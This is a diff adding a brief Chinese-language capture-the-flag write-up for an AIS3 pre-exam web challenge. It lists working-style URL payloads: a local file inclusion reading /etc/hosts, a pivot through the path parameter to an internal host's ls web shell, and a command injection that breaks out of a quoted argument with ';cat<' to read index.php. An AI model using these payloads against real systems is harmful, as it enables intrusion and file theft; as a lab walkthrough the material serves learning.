@@ -1,0 +1,12 @@
+### d1v1n6 d33p3r
+- 上一題的接續 LFI到處看看
+- payload: `http://pre-exam-web.ais3.org:10103/?path=/etc/hosts`
+- 發現這台是架在`172.22.0.3` 於是就附近晃晃發現了`172.22.0.2`這台deeper
+- 裡面是ls的web shell 先來光顧一下
+- payload: `http://pre-exam-web.ais3.org:10103/?path=http://root@172.22.0.2/?dir=./`
+- 晃晃之後沒發現可疑的檔案 進一步想應該是cmdi 然後flag就在deeper的index.php裡
+- 猜想server是這樣解析input的 `ls -al '{dir}'`
+- 於是構造payload: `./';cat<'index.php`
+- 使得cmd變成 `ls -al './';cat<'index.php'`
+- payload: `http://pre-exam-web.ais3.org:10103/?path=http://root@172.22.0.2/?dir=./%27;cat%3C%27index.php`
+- 拿到flag
